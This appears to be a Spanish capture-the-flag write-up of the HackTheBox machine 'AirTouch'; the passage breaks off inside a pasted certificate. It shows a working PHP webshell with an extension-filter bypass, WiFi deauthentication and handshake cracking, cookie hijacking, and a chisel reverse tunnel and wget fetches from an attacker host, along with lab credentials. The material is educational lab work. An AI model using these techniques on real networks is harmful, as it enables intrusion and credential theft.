---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# AirTouch HackTheBox (Intermediate)

## Contexto de la maquina

### Trayectoria AirTouch

<figure><img src="../../.gitbook/assets/trayectoria_airtouch.png" alt=""><figcaption></figcaption></figure>

### Descripción general

La máquina **AirTouch** es un laboratorio de tipo **Advanced / Real-World** orientado a evaluar conocimientos de **seguridad en infraestructuras híbridas**, combinando **servicios expuestos**, **protocolos de red mal configurados**, **segmentación de redes WiFi**, y **errores de diseño en entornos empresariales**.

El escenario simula una organización con múltiples dispositivos interconectados, incluyendo:

* Un **servidor Linux expuesto externamente**
* Servicios internos accesibles únicamente desde redes WiFi
* Redes **WPA2-PSK** y **WPA2-Enterprise (802.1X)**
* Equipos intermedios actuando como **gateways, access points y sistemas de gestión**
* Uso incorrecto de **credenciales, privilegios y certificados**

El objetivo principal es comprometer progresivamente cada segmento de la infraestructura hasta alcanzar el **control total del entorno**, demostrando cómo una cadena de fallos de seguridad aparentemente menores puede derivar en una **comprometida completa del dominio operativo**.

### Objetivo del laboratorio

* Identificar **servicios expuestos y protocolos inseguros**
* Explotar **errores de configuración** en SNMP, SSH y servicios web
* Realizar **movimiento lateral** entre segmentos de red
* Comprometer **redes WiFi empresariales**
* Abusar de **credenciales reutilizadas**
* Escalar privilegios hasta **root** en múltiples nodos

### Vulnerabilidades identificadas

A continuación se enumeran las vulnerabilidades principales explotadas durante el compromiso de la máquina, junto con su **identificación, CVE asociado (cuando existe) y nivel de criticidad**.

<figure><img src="../../.gitbook/assets/vuln_airtouch1.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln_airtouch2.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln_airtouch3.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln_airtouch4.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln_airtouch5.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln_airtouch6.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln_airtouch7.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln_airtouch8.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln_airtouch9.png" alt=""><figcaption></figcaption></figure>

## Escaneo de puertos

Comenzamos realizando un escaneo completo de puertos **TCP** con el objetivo de identificar los servicios expuestos en la máquina objetivo.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

Una vez identificados los puertos abiertos, procedemos a ejecutar un escaneo más detallado únicamente sobre dichos puertos, con el fin de obtener información adicional como versiones de servicios y scripts por defecto.

```shell
nmap -sCV -p<PORTS> <IP>
```

Resultado:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-18 05:41 -0500
Nmap scan report for 10.129.9.137
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bd:90:00:15:cf:4b:da:cb:c9:24:05:2b:01:ac:dc:3b (RSA)
|   256 6e:e2:44:70:3c:6b:00:57:16:66:2f:37:58:be:f5:c0 (ECDSA)
|_  256 ad:d5:d5:f0:0b:af:b2:11:67:5b:07:5c:8e:85:76:76 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.30 seconds
```

Observamos que únicamente existe un puerto **22/TCP** abierto. Para ampliar la superficie de ataque, realizamos un escaneo por **UDP** con el fin de detectar posibles servicios adicionales expuestos mediante este protocolo.

<figure><img src="../../.gitbook/assets/vulnCard_airtouch2.png" alt=""><figcaption></figcaption></figure>

```shell
nmap -sU --top-ports 100 -v <IP>
```

Resultado:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-18 05:47 -0500
Initiating Ping Scan at 05:47
Scanning 10.129.9.137 [4 ports]
Completed Ping Scan at 05:47, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:47
Completed Parallel DNS resolution of 1 host. at 05:47, 0.50s elapsed
Initiating UDP Scan at 05:47
Scanning 10.129.9.137 [100 ports]
Increasing send delay for 10.129.9.137 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.129.9.137 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.129.9.137 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.129.9.137 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.129.9.137 from 400 to 800 due to 11 out of 13 dropped probes since last increase.
UDP Scan Timing: About 39.56% done; ETC: 05:48 (0:00:47 remaining)
UDP Scan Timing: About 66.44% done; ETC: 05:48 (0:00:31 remaining)
Discovered open port 161/udp on 10.129.9.137
Completed UDP Scan at 05:48, 102.56s elapsed (100 total ports)
Nmap scan report for 10.129.9.137
Host is up (0.050s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp
```

Aquí podemos observar que el puerto **161/UDP (SNMP)** se encuentra abierto. Este servicio puede resultar **crítico** si no está correctamente securizado, por lo que procedemos a enumerarlo utilizando la herramienta `snmp-check`, que nos permite obtener información general del servicio SNMP.

***

> SNMP Info

SNMP es un protocolo de capa de aplicación usado para **monitorear y gestionar dispositivos de red**. Permite recopilar información y configurar routers, switches, servidores, impresoras, etc., desde una estación central.

**Arquitectura básica:** **Componentes:**

1. **Manager**: Estación de gestión (donde tú estás)
2. **Agent**: Software en el dispositivo monitoreado
3. **MIB (Management Information Base)**: Base de datos jerárquica con información del dispositivo
4. **Community String**: Contraseña/autenticación (pública/privada)

***

## Escalate user consultant

<figure><img src="../../.gitbook/assets/vulnCard_airtouch1.png" alt=""><figcaption></figcaption></figure>

```shell
snmp-check <IP>
```

Resultado:

```
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.9.137:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.129.9.137
  Hostname                      : Consultant
  Description                   : "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
  Contact                       : admin@AirTouch.htb
  Location                      : "Consultant pc"
  Uptime snmp                   : 02:39:16.15
  Uptime system                 : 02:38:13.10
  System date                   : -
```

Podemos observar que en el campo **Description** asociado al usuario `admin` se encuentra almacenada la contraseña por defecto:

```
RxBlZhLmOkacNWScmZ6D
```

Con estas credenciales disponibles, se abren varias posibilidades para continuar con la explotación del sistema.

### SSH

Después de recopilar información adicional, probamos a autenticarnos por **SSH** utilizando distintos nombres de usuario. Finalmente, probamos con el usuario `consultant`.

```shell
ssh consultant@<IP>
```

Introducimos como contraseña `RxBlZhLmOkacNWScmZ6D` y obtenemos acceso:

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

consultant@AirTouch-Consultant:~$ whoami
consultant
```

Confirmamos que hemos accedido correctamente con dicho usuario.

## Escalate user user

<figure><img src="../../.gitbook/assets/vulnCard_airtouch3.png" alt=""><figcaption></figcaption></figure>

Al comprobar los privilegios del usuario mediante `sudo -l`, observamos lo siguiente:

```
Matching Defaults entries for consultant on AirTouch-Consultant:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User consultant may run the following commands on AirTouch-Consultant:
    (ALL) NOPASSWD: ALL
```

Esto indica que el usuario tiene permisos completos sin necesidad de contraseña. Por tanto, escalamos privilegios de la siguiente forma:

```shell
sudo su
```

Resultados:

```
root@AirTouch-Consultant:/home/consultant# whoami
root
```

Ahora somos `root`, aunque aparentemente no se trata de la máquina principal, sino de un entorno tipo **Docker** u otro sistema aislado.

### Hacking WiFi (AirTouch-Inte)

<figure><img src="../../.gitbook/assets/vulnCard_airtouch4.png" alt=""><figcaption></figcaption></figure>

Investigando el sistema, observamos la presencia de herramientas relacionadas con auditoría WiFi como `aircrack-ng`, lo cual nos da una pista clara sobre el siguiente vector de ataque que vamos a explotar.

#### Enumeración de redes WiFi

Activamos la interfaz inalámbrica y comenzamos la escucha de las redes disponibles en el entorno:

```shell
ip link set wlan0 up # Habilitamos la interfaz por si acaso
airmon-ng start wlan0 # Activamos alguna interfaz en modo monitor
airodump-ng wlan0mon
```

Resultados:

```
CH  3 ][ Elapsed: 54 s ][ 2026-01-18 19:38 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 56:3A:00:95:B1:67  -28       40        0    0   6   54        CCMP   PSK  WIFI-JOHN    
 F0:9F:C2:A3:F1:A7  -28       40        0    0   6   54        CCMP   PSK  AirTouch-Inte

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   28:6C:07:12:EE:A1  -29    0 - 1      0        2         AirTouch-Offi
 (not associated)   C8:8A:9A:6F:F9:D2  -29    0 - 1      0        6         AccessLink,Ai
 (not associated)   28:6C:07:12:EE:F3  -29    0 - 1      0        8         AirTouch-Offi
Quitting...
```

Entre las redes detectadas, identificamos **AirTouch-Inte**, que parece ser el objetivo principal. Con su **BSSID**, procedemos a capturar el _handshake_ de autenticación.

#### Captura del handshake

Iniciamos la captura enfocándonos en el canal y BSSID específicos:

```shell
airodump-ng -c 6 --bssid F0:9F:C2:A3:F1:A7 -w airtouch_capture wlan0mon
```

En una segunda terminal, forzamos la reconexión de los clientes para acelerar la captura del _handshake_:

```shell
aireplay-ng -0 10 -a F0:9F:C2:A3:F1:A7 wlan0mon
```

Tras unos segundos, confirmamos que el _handshake_ ha sido capturado correctamente:

```
CH  6 ][ Elapsed: 42 s ][ 2026-01-18 19:39 ][ WPA handshake: F0:9F:C2:A3:F1:A7 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:A3:F1:A7  -28 100      454       25    0   6   54        CCMP   PSK  AirTouch-

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29    1 - 1     46       35  EAPOL  AirTouch-Inte
Quitting...
```

Se genera el archivo `airtouch_capture-01.cap`, el cual utilizaremos para proceder con el crackeo del _handshake_.

### Crackeo del Handshake

Para realizar el ataque de diccionario, transferimos primero el archivo `rockyou.txt` a la máquina víctima.

En la máquina atacante:

```shell
cp /usr/share/wordlists/rockyou.txt .
python3 -m http.server 80
```

En la máquina víctima:

```shell
wget http://<IP_ATTACKER>/rockyou.txt
```

Una vez disponible el diccionario, ejecutamos `aircrack-ng` contra el archivo capturado:

```shell
aircrack-ng -w rockyou.txt airtouch_capture-01.cap
```

Resultado:

```
Aircrack-ng 1.6 

      [00:00:09] 22832/14344392 keys tested (2482.77 k/s) 

      Time left: 1 hour, 36 minutes, 10 seconds                  0.16%

                           KEY FOUND! [ challenge ]


      Master Key     : D1 FF 70 2D CB 11 82 EE C9 E1 89 E1 69 35 55 A0 
                       07 DC 1B 21 BE 35 8E 02 B8 75 74 49 7D CF 01 7E 

      Transient Key  : E5 A9 7E 3B B7 D1 FC 25 97 9F F1 56 66 93 12 6D 
                       91 0C 95 5F 6A F4 A0 31 A7 25 1F BE BF 14 9B 30 
                       8F F6 F8 7F FB 3D 9B 53 FF B0 33 74 FC 0F 0C 6D 
                       1E FD B5 BA A8 05 8C C9 78 B0 87 BA E7 77 DD CB 

      EAPOL HMAC     : 02 4A AF 17 1E A8 76 08 83 C1 94 08 0E 60 0C 9B
```

La contraseña de la red WiFi obtenida es:

```
challenge
```

### Conexión a red wifi

Con la contraseña válida, generamos el archivo de configuración para conectarnos a la red:

```shell
wpa_passphrase "AirTouch-Internet" "challenge" > /tmp/wifi.conf
```

Establecemos la conexión utilizando `wpa_supplicant`:

```shell
wpa_supplicant -i wlan1 -c /tmp/wifi.conf -B -f /tmp/wpa.log
```

***

> Utilizamos `wlan1` porque es la interfaz asociada a la red WiFi.

Verificamos que la red está disponible y correctamente identificada:

```shell
iw dev wlan1 scan 2>/dev/null | grep -B2 -A2 "AirTouch-Inte"
```

Resultado:

```
last seen: 0 ms ago
	Information elements from Probe Response frame:
	SSID: AirTouch-Internet
	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
	DS Parameter set: channel 6
```

***

Comprobamos el estado de la conexión:

```shell
iw dev wlan1 link
```

Resultado:

```
Connected to f0:9f:c2:a3:f1:a7 (on wlan1)
	SSID: AirTouch-Internet
	freq: 2437
	RX: 4861 bytes (78 packets)
	TX: 1055 bytes (10 packets)
	signal: -30 dBm
	rx bitrate: 1.0 MBit/s
	tx bitrate: 24.0 MBit/s

	bss flags:	short-slot-time
	dtim period:	2
	beacon int:	100
```

Solicitamos una dirección IP vía DHCP:

```shell
dhclient -v wlan1
```

Resultado:

```
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan1/02:00:00:00:01:00
Sending on   LPF/wlan1/02:00:00:00:01:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan1 to 255.255.255.255 port 67 interval 3 (xid=0x5874300f)
DHCPOFFER of 192.168.3.23 from 192.168.3.1
DHCPREQUEST for 192.168.3.23 on wlan1 to 255.255.255.255 port 67 (xid=0xf307458)
DHCPACK of 192.168.3.23 from 192.168.3.1 (xid=0x5874300f)
bound to 192.168.3.23 -- renewal in 36197 seconds.
```

Obtenemos la IP asignada:

```
192.168.3.23
```

Ya estamos dentro de la red `192.168.3.0/24`.

### Tunelización de `IP` a máquina atacante

Para pivotar el tráfico desde la red interna hacia nuestra máquina atacante, utilizamos la herramienta **chisel**.

Primero descargamos, preparamos y transferimos el binario.

En la máquina atacante:

```shell
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel
python3 -m http.server 80
```

En la maquina victima:

```shell
wget http://<IP_ATTACKER>/chisel
chmod +x chisel
```

Con todo preparado, realizamos la `tunelización` completa de la `IP` hacia la máquina atacante.

> Máquina atacante

```shell
./chisel server -p 1081 --reverse
```

> Maquina victima

```shell
./chisel client <IP_ATTACKER>:1081 R:socks
```

Confirmamos que el túnel está activo y configuramos `proxychains` para enrutar el tráfico.

```shell
nano /etc/proxychains4.conf

#Dentro del nano
socks5 127.0.0.1 1080
```

### Acceso al gateway

<figure><img src="../../.gitbook/assets/vulnCard_airtouch5.png" alt=""><figcaption></figcaption></figure>

Con el túnel activo, escaneamos el gateway interno de la red:

```shell
sudo proxychains nmap -sT -p- 192.168.3.1
```

Resultado:

```
Nmap scan report for 192.168.3.1
Host is up (0.00039s latency).

PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

Identificamos el puerto **80/TCP** abierto y accedemos a él mediante navegador utilizando **FoxyProxy**:

<figure><img src="../../.gitbook/assets/Pasted image 20260118215938.png" alt=""><figcaption></figcaption></figure>

Accedemos a la siguiente URL:

```
URL = http://192.168.3.1/
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260118220006.png" alt=""><figcaption></figcaption></figure>

Aparece un panel de login correspondiente al router interno.

### Análisis PCAP

Capturamos tráfico `WiFi` y lo transferimos para analizarlo:

```shell
airodump-ng -c 6 --bssid F0:9F:C2:A3:F1:A7 -w captura wlan0mon
```

Descargamos la captura de esta forma:

> Maquina victima

```shell
python3 -m http.server 8000
```

> Maquina atacante

```shell
proxychains -q wget http://192.168.3.23:8000/captura-01.cap
```

Una vez que nos lo hayamos descargado vamos a decodificarlo utilizando el `password` que obtuvimos del `wifi`.

### Secuestro de Cookie

Comenzamos descifrando la captura de tráfico previamente obtenida para poder analizar el contenido HTTP en claro.

```shell
airdecap-ng -e "AirTouch-Internet" -p "challenge" captura-01.cap
```

Resultado:

```
Total number of stations seen            2
Total number of packets read         15481
Total number of WEP data packets         0
Total number of WPA data packets        51
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets        41
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0
```

Una vez descifrado el tráfico, abrimos la captura en **Wireshark** para su análisis.

<figure><img src="../../.gitbook/assets/Pasted image 20260120163247.png" alt=""><figcaption></figcaption></figure>

Seguimos el _HTTP Stream_ y observamos cookies de sesión válidas pertenecientes a un usuario autenticado.

<figure><img src="../../.gitbook/assets/vulnCard_airtouch6.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Pasted image 20260120163423.png" alt=""><figcaption></figcaption></figure>

Procedemos a reemplazar la cookie capturada en nuestra sesión actual y recargamos la página.

<figure><img src="../../.gitbook/assets/Pasted image 20260120163453.png" alt=""><figcaption></figcaption></figure>

De esta forma, accedemos correctamente como usuario autenticado dentro del panel.

Investigando un poco más, observamos que con este `rol` inicial no tenemos demasiadas capacidades. Sin embargo, si desde el apartado de `rol` modificamos el valor a `admin`, comprobamos que ahora sí se habilitan funcionalidades adicionales.



<figure><img src="../../.gitbook/assets/Pasted image 20260120163705 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Pasted image 20260120163715.png" alt=""><figcaption></figcaption></figure>

Al tener asignado este `rol`, aparece un apartado que permite la carga de archivos, aunque se muestra una advertencia indicando que los archivos `PHP` y `HTML` están bloqueados.

### Subida de archivo y bypass

<figure><img src="../../.gitbook/assets/vulnCard_airtouch7.png" alt=""><figcaption></figcaption></figure>

Detectamos la funcionalidad de subida de archivos e intentamos realizar un _bypass_ de extensión subiendo un archivo `.phtml`.

Archivo:

> shell.php

```php
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Si intentamos subir el archivo con la extensión original, el sistema lo bloquea indicando que no se pueden subir archivos `PHP` ni `HTML`. Por ello, probamos a realizar un pequeño _bypass_ de extensión renombrando el archivo.

Renombramos el archivo a `shell.phtml` y procedemos a subirlo. Al hacerlo, obtenemos el siguiente mensaje:

```
The file shell1.phtml has been uploaded to folder uploads/ 
```

Esto confirma que el _bypass_ ha funcionado correctamente. A continuación, accedemos a la siguiente ruta y ejecutamos un comando sencillo para verificar la ejecución remota:

```
URL = http://192.168.3.1/uploads/shell1.phtml?cmd=whoami
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260120164752.png" alt=""><figcaption></figcaption></figure>

Confirmamos que la ejecución remota de comandos está funcionando correctamente. Sin embargo, tras intentar durante un tiempo obtener una `reverse shell`, decidimos inspeccionar directamente el archivo `login.php` utilizando la webshell.

```
URL = http://192.168.3.1/uploads/shell1.phtml?cmd=cat ../login.php
```

Resultado:

```php
<pre><?php session_start(); /* Starts the session */

// Check if user is already logged in
if (isset($_SESSION['UserData']['Username'])) {
  header("Location:index.php"); // Redirect to index.php
  exit; // Make sure to exit after redirection
}

session_start();


if (isset($_POST['Submit'])) {
  /* Define username, associated password, and user attribute array */
  $logins = array(
    /*'user' => array('password' => 'JunDRDZKHDnpkpDDvay', 'role' => 'admin'),*/
    'manager' => array('password' => '2wLFYNh4TSTgA5sNgT4', 'role' => 'user')
  );

  /* Check and assign submitted Username and Password to new variable */
  $Username = isset($_POST['Username']) ? $_POST['Username'] : '';
  $Password = isset($_POST['Password']) ? $_POST['Password'] : '';

  /* Check Username and Password existence in defined array */
  if (isset($logins[$Username]) && $logins[$Username]['password'] === $Password) {
    /* Success: Set session variables and redirect to Protected page  */
    $_SESSION['UserData']['Username'] = $logins[$Username]['password'];
    /* Success: Set session variables USERNAME  */
    $_SESSION['Username'] = $Username;

    // Set a cookie with the user's role
    setcookie('UserRole', $logins[$Username]['role'], time() + (86400 * 30), "/"); // 86400 = 1 day

    header("location:index.php");
    exit;
  } else {
    /*Unsuccessful attempt: Set error message */
    $msg = "<span style='color:red'>Invalid Login Details</span>";
  }
}

?>
```

Del análisis del código, obtenemos las siguientes credenciales:

```
User: user
Pass: JunDRDZKHDnpkpDDvay

User: manager
Pass: 2wLFYNh4TSTgA5sNgT4
```

La cuenta `user` se encuentra comentada dentro del código, por lo que no será válida para el login web. Sin embargo, si revisamos los puertos disponibles desde el usuario `root` que ya poseemos, observamos que existe un servicio `SSH`. En este caso, probamos a conectarnos directamente desde el `gateway` utilizando las credenciales del usuario `user`.

### SSH (user)

<figure><img src="../../.gitbook/assets/vulnCard_airtouch8.png" alt=""><figcaption></figcaption></figure>

```shell
ssh user@192.168.3.1
```

Introducimos como contraseña `JunDRDZKHDnpkpDDvay`:

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user@AirTouch-AP-PSK:~$ whoami
user
```

Con esto confirmamos que hemos accedido correctamente al sistema con el usuario `user`.

## Escalate user remote

Al ejecutar `sudo -l`, observamos lo siguiente:

```
Matching Defaults entries for user on AirTouch-AP-PSK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on AirTouch-AP-PSK:
    (ALL) NOPASSWD: ALL
```

Esto indica que el usuario tiene privilegios completos, por lo que procedemos a escalar a `root`:

```
root@AirTouch-AP-PSK:/home/user# whoami
root
```

Aunque parece tratarse nuevamente de un entorno tipo `Docker`, si accedemos a la `home` de `root` encontramos la `flag` del usuario.

> user.txt

```
ba505a19e5b06d474411ca1b7235ee28
```

Dentro de la misma `home` encontramos varios archivos interesantes. Entre ellos destaca `send_certs.sh`, que al inspeccionarlo contiene lo siguiente:

> send\_certs.sh

```bash
#!/bin/bash

# DO NOT COPY
# Script to sync certs-backup folder to AirTouch-office. 

# Define variables
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
REMOTE_PATH="~/certs-backup/"
LOCAL_FOLDER="/root/certs-backup/"

# Use sshpass to send the folder via SCP
sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH"
```

Aquí se nos proporcionan directamente las credenciales del usuario `remote`, junto con su contraseña, y se observa un intento de conexión a la IP `10.10.10.1`. Según los comentarios, esta IP pertenece a la red `AirTouch-office`.

Dado que parece que hemos llegado al final de la VLAN actual, regresamos a la máquina principal y ejecutamos el siguiente comando para enumerar redes WiFi disponibles:

```shell
iwlist wlan1 scan
```

Resultado:

```
...................................<RESTO DE INFO>.................................
Cell 06 - Address: AC:8B:A9:F3:A1:13
                    Channel:44
                    Frequency:5.22 GHz (Channel 44)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"AirTouch-Office"
                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 18 Mb/s; 24 Mb/s
                              36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=000648d45515e50b
                    Extra: Last beacon: 76ms ago
                    IE: Unknown: 000F416972546F7563682D4F6666696365
                    IE: Unknown: 01088C129824B048606C
                    IE: Unknown: 03012C
                    IE: Unknown: 070A45532024041795060D00
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : 802.1x
                    IE: Unknown: 3B027300
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD180050F2020101010003A4000027F7000043FF5E0067FF2F00
...................................<RESTO DE INFO>.................................
```

Basándonos en esta información, observamos que la red no utiliza seguridad `PSK`, sino **WPA2-Enterprise (802.1X)**.

***

> Informacion detallada

**Tipo de Seguridad: WPA2-Enterprise (802.1X)**

**Características específicas:**

1. **Autenticación: 802.1X** - No usa PSK (Pre-Shared Key)
2. **Cifrado: CCMP** (AES-128 en modo CCM)
   * Group Cipher: CCMP (para tráfico broadcast/multicast)
   * Pairwise Cipher: CCMP (para tráfico unicast)
3. **Enterprise RADIUS**: Requiere servidor de autenticación centralizado

**Protocolo específico detectado:**

* **PEAP-MSCHAPv2** (más probable dado el contexto)
* Posiblemente EAP-TLS (si hay certificados de cliente)

**Otros elementos técnicos relevantes:**

1. **Channel 44** (5.22 GHz) - Red 5GHz
2. **Signal level: -30 dBm** - Señal excelente, muy cercana
3. **Bit Rates soportados**: Hasta 54 Mbps (802.11a/n)

**IE adicionales interesantes:**

* `IE: Unknown: 7F080400400200000040` - Posiblemente elementos de WMM (WiFi Multimedia/QoS)
* `IE: Unknown: DD180050F2020101010003A4000027F7000043FF5E0067FF2F00` - Elemento vendor específico

***

### Evil Portal (AirTouch-Office)

Sabiendo esto, no podemos capturar el `handshake` como tal de la red. Es decir, aunque lo consiguiéramos, no se puede descifrar el `hash` del mismo debido al nivel de seguridad, por lo que esta vía es inviable.

Sin embargo, lo que sí podemos intentar es montar un `evil-portal`. La idea consiste en duplicar la red `wifi` de `AirTouch-Office` y engañar a los clientes para que se conecten a nuestro punto de acceso falso. Al hacerlo, se les presentará un `login` de autenticación, lo que nos permitirá capturar el `hash` de los usuarios que caigan en la trampa.

Para llevar a cabo este ataque nos viene perfecto utilizar la herramienta `eaphammer`, que ya tenemos instalada en la máquina principal.

Esto es posible porque disponemos de los certificados necesarios de dicha `wifi`.

#### Transferencia de certificados

Vamos a pasarnos los certificados a la máquina principal. Para ello, leemos su contenido, lo copiamos y lo pegamos en los archivos correspondientes en la máquina principal.

> ca.crt

```
-----BEGIN CERTIFICATE-----
MIIEwjCCA6qgAwIBAgIUZHmGOdbZqK3C4PnyAJG5WVnJwqswDQYJKoZIhvcNAQEL
BQAwgZgxCzAJBgNVBAYTAkVTMQ8wDQYDVQQIEwZNYWRyaWQxDzANBgNVBAcTBk1h
ZHJpZDERMA8GA1UEChMIQWlyVG91Y2gxHjAcBgNVBAsTFUNlcnRpZmljYXRlIEF1
dGhvcml0eTEUMBIGA1UEAxMLQWlyVG91Y2ggQ0ExHjAcBgkqhkiG9w0BCQEWD2Nh
QEFpclRvdWNoLmh0YjAeFw0yNDAyMjcxNzA3NTNaFw0zNDAyMjQxNzA3NTNaMIGY
MQswCQYDVQQGEwJFUzEPMA0GA1UECBMGTWFkcmlkMQ8wDQYDVQQHEwZNYWRyaWQx
ETAPBgNVBAoTCEFpclRvdWNoMR4wHAYDVQQLExVDZXJ0aWZpY2F0ZSBBdXRob3Jp
dHkxFDASBgNVBAMTC0FpclRvdWNoIENBMR4wHAYJKoZIhvcNAQkBFg9jYUBBaXJU
b3VjaC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDAO9RnpEfg
oCSUvZsDtfUllPTBzkQ/iLQDB+QgRgXpKgFnnscUfib/9kzFX8qWwzIflErW7TGx
PHZFDwa2QmDndNGVVlj5LvIiHboSVOew8YoP/D8vwxN9n8tTCjQMiVbw1sRmHX30
bQ7fFXi8TvBYs+RZ2YuPkRNMXkYLODYRqtvB4DxWJ4msoGUWAoz6XGSaYiuMSpHz
7ePduN4E4pgRMpeH6smibQ5HazNNGAk5qS3eKPuU6Ghfjfj4xKt1kT1w3Zhbml2k
o+na7WnAril1UMP8G2hKv+k3gcTv7cRxsbTxe28XJCunWzXUcPhrff1TsJqODBuc
BpEkOVpCKLePAgMBAAGjggEAMIH9MA8GA1UdEwQIMAYBAf8CAQAwNgYDVR0fBC8w
LTAroCmgJ4YlaHR0cDovL0FpclRvdWNoLmh0Yi9jYS9tdXN0ZXJtYW5uLmNybDAR
BglghkgBhvhCAQEEBAMCAAcwMAYJYIZIAYb4QgEIBCMWIWh0dHA6Ly9BaXJUb3Vj
aC5odGIvY2EvcG9saWN5Lmh0bTAyBglghkgBhvhCAQQEJRYjaHR0cDovL0FpclRv
dWNoLmh0Yi9jYS9oZWltcG9sZC5jcmwwGgYJYIZIAYb4QgENBA0WC0FpclRvdWNo
IENBMB0GA1UdDgQWBBRnB0B7qa/Iv+6VDjUMgJUionockTANBgkqhkiG9w0BAQsF
AAOCAQEAYBEnC21dv7FGjdaFC8jYYLdC2tg2ZaIaKGRHi4yN9XuvOtV3fZdVECuC
CD10AK23GfPMKm7vyAHyyZSb0zDoRmqV/CVfcEenRUC00+JHia1YVl5AqlboSjqZ
BOKTofk4CjtG2F8eV1AMU78ozmuiDYzWh+ateIG3VyZhP6q2E9MoaOTzvZubshW4
